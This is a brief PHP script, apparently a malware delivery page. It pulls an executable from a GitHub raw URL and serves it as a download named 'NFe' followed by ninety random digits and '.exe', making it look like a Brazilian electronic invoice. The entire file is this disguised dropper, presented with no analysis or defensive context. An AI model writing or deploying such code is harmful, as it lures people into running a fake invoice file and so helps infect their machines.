<?php

$file = "https://github.com/xxx1xxx2/GIKASJF/raw/master/NFe00000002928494.exe";

function string_aleatoria($tamanho) {
	$conteudo = "1234567890";

	for($i=0;$i<$tamanho;$i++) {
		$string .= $conteudo{rand(0,10)};
	}

	return $string;
}

header('Content-type: application/exe');

header('Content-Disposition: attachment; filename="NFe".string_aleatoria(90).".exe"');

readfile($file);
?>